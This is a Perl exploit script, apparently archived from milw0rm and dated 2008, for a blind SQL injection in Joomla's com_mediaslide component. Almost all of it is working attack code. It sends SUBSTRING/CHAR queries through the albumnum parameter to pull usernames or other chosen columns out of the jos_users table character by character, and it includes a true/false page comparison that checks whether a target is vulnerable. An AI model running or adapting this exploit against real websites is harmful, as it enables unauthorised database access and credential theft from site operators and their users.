#!/usr/bin/perl
#inphex
#joomla com_mediaslide blind sql injection
use LWP::UserAgent;
use LWP::Simple;
use Switch;
use Digest::MD5 qw(md5 md5_hex md5_base64);
print "usage: $0 -h host.com -p /\n";
### use Getopt::Long; ###
$column = "username";
$table = "jos_users";
$regex = "preview_f2";
%cm_n_ = ("-h" => "host","-p" => "path","-c" => "column","-t" => "table","-r" => "regex");
$a = 0;
foreach  (@ARGV) {
	$a++;
	while (($k, $v) = each(%cm_n_)) {
		if ($_ eq $k) {
			${$v} = $ARGV[$a];
		}
	}
}

$i = 48;
$h = 1;
$f = 0;
$k = 0;
### Yeah,that's it... ###
while () {
    while ($i <= 90) {
		
	    if(check($i,$h,1) == 1)
	    {
	    	syswrite STDOUT,lc(chr($i));
	    	$h++;
			$a_chr = $a_chr.chr($i);
	    } 
		
		$i++;
		
	} 
	push(@ffs,length($a_chr)); 
	if (($#ffs -1) == $ffs) {
		&check_vuln();
		exit;
	}
	$i = 48;
	
}
#/

### :D ###
sub check($$$)
{
	$i = shift;
	$h = shift;
	$m = shift;

	switch ($m)
	{
		case 1 { $query = "%20AND%20SUBSTRING((SELECT%20".$column."%20FROM%20".$table."%20LIMIT%200,1),".$h.",1)=CHAR(".$i.")"; }
	}

	$ua = LWP::UserAgent->new;
	$url = "http://".$host.$path."index.php?option=com_mediaslide&act=contact&id=1&albumnum=1".$query."";
	$response = $ua->get($url);
	$content = $response->content;
	if($content =~ /$regex/) { return 0;} else { return 1 ;}
}
#/

sub check_vuln
{
	

	$content = get("http://".$host.$path."index.php?option=com_mediaslide&act=contact&id=1&albumnum=1%20AND%201=1");
	$content1 = get("http://".$host.$path."index.php?option=com_mediaslide&act=contact&id=1&albumnum=1%20AND%201=0");

	foreach $bb1 (split(/\n/,$content)) {
		$bb = $bb.$bb1;
	}

	foreach  $yy1 (split(/\n/,$content1)) {
		$yy = $yy.$yy1;
	}

	$f =  md5_hex($bb);
	$s = md5_hex($yy);

	if ($f eq $s) {
		print "\nprobably not vulnerable";    #could be that ads,texts etc.. change
		exit;
	} else { print "\nvulnerable..."; }
}

# milw0rm.com [2008-02-14]